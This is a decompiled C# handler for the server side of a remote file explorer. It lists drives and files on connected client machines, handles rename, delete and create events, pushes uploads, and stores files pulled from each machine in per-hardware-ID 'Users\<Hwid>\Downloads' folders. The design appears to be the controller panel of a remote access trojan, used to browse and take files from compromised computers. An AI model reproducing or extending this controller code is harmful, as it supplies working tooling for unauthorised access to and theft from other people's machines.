using System.Collections;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Leb128;
using Server.Connectings;
using Server.Forms;
using Server.Helper;

namespace Server.Messages;

internal class HandlerExplorer
{
	public static void Read(Clients client, object[] objects)
	{
		string text = (string)objects[1];
		if (text == null)
		{
			return;
		}
		switch (text.Length)
		{
		case 7:
			switch (text[0])
			{
			case 'C':
			{
				if (!(text == "Connect"))
				{
					break;
				}
				FormExplorer form2 = (FormExplorer)Application.OpenForms["Explorer:" + (string)objects[2]];
				if (form2 == null)
				{
					client.Disconnect();
					break;
				}
				form2.Invoke((MethodInvoker)delegate
				{
					form2.Text = "Explorer [" + (string)objects[2] + "]";
					form2.client = client;
					form2.materialLabel1.Text = "Succues Connect";
					string[] array = ((string)objects[3]).Split(',');
					foreach (string value in array)
					{
						DataGridViewRow dataGridViewRow2 = new DataGridViewRow
						{
							Cells = 
							{
								(DataGridViewCell)new DataGridViewImageCell
								{
									Value = form2.imageList1.Images["folder.png"]
								},
								(DataGridViewCell)new DataGridViewTextBoxCell
								{
									Value = value
								}
							}
						};
						form2.dataGridView3.Rows.Add(dataGridViewRow2);
					}
					array = ((string)objects[4]).Split(',');
					foreach (string text2 in array)
					{
						string value2 = text2.Split(';')[0];
						string obj = text2.Split(';')[1];
						DataGridViewRow dataGridViewRow3 = new DataGridViewRow();
						if (obj == "Drive")
						{
							dataGridViewRow3.Cells.Add(new DataGridViewImageCell
							{
								Value = form2.imageList1.Images["hard-disk.png"]
							});
						}
						else
						{
							dataGridViewRow3.Cells.Add(new DataGridViewImageCell
							{
								Value = form2.imageList1.Images["usb-drive.png"]
							});
						}
						dataGridViewRow3.Cells.Add(new DataGridViewTextBoxCell
						{
							Value = value2
						});
						form2.dataGridView1.Rows.Add(dataGridViewRow3);
					}
					form2.dataGridView1.Enabled = true;
					form2.dataGridView2.Enabled = true;
					form2.dataGridView3.Enabled = true;
				});
				client.Tag = form2;
				client.Hwid = (string)objects[2];
				break;
			}
			case 'D':
			{
				if (!(text == "Deleted"))
				{
					break;
				}
				if (client.Tag == null)
				{
					client.Disconnect();
					break;
				}
				FormExplorer form3 = (FormExplorer)client.Tag;
				form3.Invoke((MethodInvoker)delegate
				{
					form3.materialLabel1.Text = "Deleted file or directory";
					foreach (DataGridViewRow item in (IEnumerable)form3.dataGridView2.Rows)
					{
						if ((string)item.Cells[1].Value == (string)objects[2])
						{
							form3.dataGridView2.Rows.Remove(item);
							break;
						}
					}
				});
				break;
			}
			case 'R':
			{
				if (!(text == "Renamed"))
				{
					break;
				}
				if (client.Tag == null)
				{
					client.Disconnect();
					break;
				}
				FormExplorer form = (FormExplorer)client.Tag;
				form.Invoke((MethodInvoker)delegate
				{
					form.materialLabel1.Text = "Renamed file or directory";
					foreach (DataGridViewRow item2 in (IEnumerable)form.dataGridView2.Rows)
					{
						if ((string)item2.Cells[1].Value == (string)objects[2])
						{
							item2.Cells[1].Value = (string)objects[3];
							item2.Cells[2].Value = (string)objects[4];
							item2.Cells[3].Value = (string)objects[5];
							if (objects.Length > 5)
							{
								using (MemoryStream stream = new MemoryStream((byte[])objects[6]))
								{
									item2.Cells[0].Value = Image.FromStream(stream);
								}
								item2.Cells[4].Value = Methods.BytesToString((long)objects[7]);
							}
							break;
						}
					}
				});
				break;
			}
			}
			break;
		case 5:
			switch (text[0])
			{
			case 'F':
			{
				if (!(text == "Files"))
				{
					break;
				}
				if (client.Tag == null)
				{
					client.Disconnect();
					break;
				}
				FormExplorer form5 = (FormExplorer)client.Tag;
				form5.Invoke((MethodInvoker)delegate
				{
					form5.rjTextBox1.Texts = (string)objects[2];
					form5.materialLabel1.Text = "Succues Get Folder's and File's";
					form5.dataGridView2.Rows.Clear();
					DataGridViewRow dataGridViewRow5 = new DataGridViewRow
					{
						Cells = 
						{
							(DataGridViewCell)new DataGridViewImageCell
							{
								Value = form5.imageList1.Images["folder.png"],
								Tag = (byte)2,
								ImageLayout = DataGridViewImageCellLayout.Zoom
							},
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = "..."
							},
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = ""
							},
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = ""
							}
						}
					};
					form5.dataGridView2.Rows.Add(dataGridViewRow5);
					object[] array2 = LEB128.Read((byte[])objects[3]);
					int num = 0;
					while (num < array2.Length)
					{
						string value3 = (string)array2[num++];
						string value4 = (string)array2[num++];
						string value5 = (string)array2[num++];
						DataGridViewRow dataGridViewRow6 = new DataGridViewRow
						{
							Cells = 
							{
								(DataGridViewCell)new DataGridViewImageCell
								{
									Value = form5.imageList1.Images["folder.png"],
									Tag = (byte)1,
									ImageLayout = DataGridViewImageCellLayout.Zoom
								},
								(DataGridViewCell)new DataGridViewTextBoxCell
								{
									Value = value3
								},
								(DataGridViewCell)new DataGridViewTextBoxCell
								{
									Value = value5
								},
								(DataGridViewCell)new DataGridViewTextBoxCell
								{
									Value = value4
								},
								(DataGridViewCell)new DataGridViewTextBoxCell
								{
									Value = ""
								}
							}
						};
						form5.dataGridView2.Rows.Add(dataGridViewRow6);
					}
					object[] array3 = LEB128.Read((byte[])objects[4]);
					object[] list = LEB128.Read((byte[])objects[5]);
					int num2 = 0;
					while (num2 < array3.Length)
					{
						string value6 = (string)array3[num2++];
						string hash = (string)array3[num2++];
						string value7 = (string)array3[num2++];
						string value8 = (string)array3[num2++];
						long byteCount = (long)array3[num2++];
						DataGridViewRow dataGridViewRow7 = new DataGridViewRow();
						using (MemoryStream stream2 = new MemoryStream(Methods.getIcon(hash, list)))
						{
							dataGridViewRow7.Cells.Add(new DataGridViewImageCell
							{
								Value = Image.FromStream(stream2),
								Tag = (byte)0,
								ImageLayout = DataGridViewImageCellLayout.Zoom
							});
						}
						dataGridViewRow7.Cells.Add(new DataGridViewTextBoxCell
						{
							Value = value6
						});
						dataGridViewRow7.Cells.Add(new DataGridViewTextBoxCell
						{
							Value = value8
						});
						dataGridViewRow7.Cells.Add(new DataGridViewTextBoxCell
						{
							Value = value7
						});
						dataGridViewRow7.Cells.Add(new DataGridViewTextBoxCell
						{
							Value = Methods.BytesToString(byteCount)
						});
						form5.dataGridView2.Rows.Add(dataGridViewRow7);
					}
					form5.dataGridView1.Enabled = true;
					form5.dataGridView2.Enabled = true;
					form5.dataGridView3.Enabled = true;
				});
				break;
			}
			case 'E':
			{
				if (!(text == "Error"))
				{
					break;
				}
				if (client.Tag == null)
				{
					client.Disconnect();
					break;
				}
				FormExplorer form4 = (FormExplorer)client.Tag;
				form4.Invoke((MethodInvoker)delegate
				{
					form4.materialLabel1.Text = "Error: " + (string)objects[2];
					form4.dataGridView1.Enabled = true;
					form4.dataGridView2.Enabled = true;
					form4.dataGridView3.Enabled = true;
				});
				break;
			}
			}
			break;
		case 10:
		{
			if (!(text == "CreatedDir"))
			{
				break;
			}
			if (client.Tag == null)
			{
				client.Disconnect();
				break;
			}
			FormExplorer form7 = (FormExplorer)client.Tag;
			form7.Invoke((MethodInvoker)delegate
			{
				form7.materialLabel1.Text = "Created New Directory";
				DataGridViewRow dataGridViewRow9 = new DataGridViewRow
				{
					Cells = 
					{
						(DataGridViewCell)new DataGridViewImageCell
						{
							Value = form7.imageList1.Images["folder.png"],
							Tag = (byte)1,
							ImageLayout = DataGridViewImageCellLayout.Zoom
						},
						(DataGridViewCell)new DataGridViewTextBoxCell
						{
							Value = (string)objects[2]
						},
						(DataGridViewCell)new DataGridViewTextBoxCell
						{
							Value = (string)objects[3]
						},
						(DataGridViewCell)new DataGridViewTextBoxCell
						{
							Value = (string)objects[4]
						},
						(DataGridViewCell)new DataGridViewTextBoxCell
						{
							Value = ""
						}
					}
				};
				form7.dataGridView2.Rows.Add(dataGridViewRow9);
				form7.dataGridView2.Sort(new CustomComparer());
			});
			break;
		}
		case 11:
		{
			if (!(text == "CreatedFile"))
			{
				break;
			}
			if (client.Tag == null)
			{
				client.Disconnect();
				break;
			}
			FormExplorer form6 = (FormExplorer)client.Tag;
			form6.Invoke((MethodInvoker)delegate
			{
				form6.materialLabel1.Text = "Created New File";
				DataGridViewRow dataGridViewRow8 = new DataGridViewRow();
				using (MemoryStream stream3 = new MemoryStream((byte[])objects[2]))
				{
					dataGridViewRow8.Cells.Add(new DataGridViewImageCell
					{
						Value = Image.FromStream(stream3),
						Tag = (byte)0,
						ImageLayout = DataGridViewImageCellLayout.Zoom
					});
				}
				dataGridViewRow8.Cells.Add(new DataGridViewTextBoxCell
				{
					Value = (string)objects[3]
				});
				dataGridViewRow8.Cells.Add(new DataGridViewTextBoxCell
				{
					Value = (string)objects[4]
				});
				dataGridViewRow8.Cells.Add(new DataGridViewTextBoxCell
				{
					Value = (string)objects[5]
				});
				dataGridViewRow8.Cells.Add(new DataGridViewTextBoxCell
				{
					Value = Methods.BytesToString((long)objects[6])
				});
				form6.dataGridView2.Rows.Add(dataGridViewRow8);
				form6.dataGridView2.Sort(new CustomComparer());
			});
			break;
		}
		case 13:
		{
			if (!(text == "UploadConnect"))
			{
				break;
			}
			FormUpload form8 = (FormUpload)Application.OpenForms[(string)objects[2]];
			if (form8 == null)
			{
				client.Disconnect();
				break;
			}
			form8.Invoke((MethodInvoker)delegate
			{
				form8.client = client;
				form8.Connected();
			});
			client.SendChunk(LEB128.Write(new object[3] { "Uploaded", form8.pathto, form8.bytes }));
			break;
		}
		case 15:
		{
			if (!(text == "DownloadConnect"))
			{
				break;
			}
			FormExplorer form9 = (FormExplorer)Application.OpenForms["Explorer:" + (string)objects[2]];
			if (form9 == null)
			{
				client.Disconnect();
				break;
			}
			client.Hwid = (string)objects[2];
			form9.Invoke((MethodInvoker)delegate
			{
				FormDownload formDownload2 = new FormDownload
				{
					Text = "Download: " + (string)objects[2],
					Name = "Download: " + (string)objects[2] + "." + (string)objects[4],
					parrent = form9.client,
					client = client,
					SizeFile = (long)objects[3],
					NameFile = (string)objects[4]
				};
				client.Tag = formDownload2;
				formDownload2.Show();
			});
			break;
		}
		case 12:
		{
			if (!(text == "DownloadFile"))
			{
				break;
			}
			if (client.Tag == null)
			{
				client.Disconnect();
				break;
			}
			FormDownload formDownload = (FormDownload)client.Tag;
			formDownload.Close();
			if (!Directory.Exists("Users\\" + client.Hwid + "\\Downloads"))
			{
				Directory.CreateDirectory("Users\\" + client.Hwid + "\\Downloads");
			}
			File.WriteAllBytes("Users\\" + client.Hwid + "\\Downloads\\" + formDownload.NameFile, (byte[])objects[2]);
			client.Disconnect();
			break;
		}
		case 6:
		case 8:
		case 9:
		case 14:
			break;
		}
	}
}
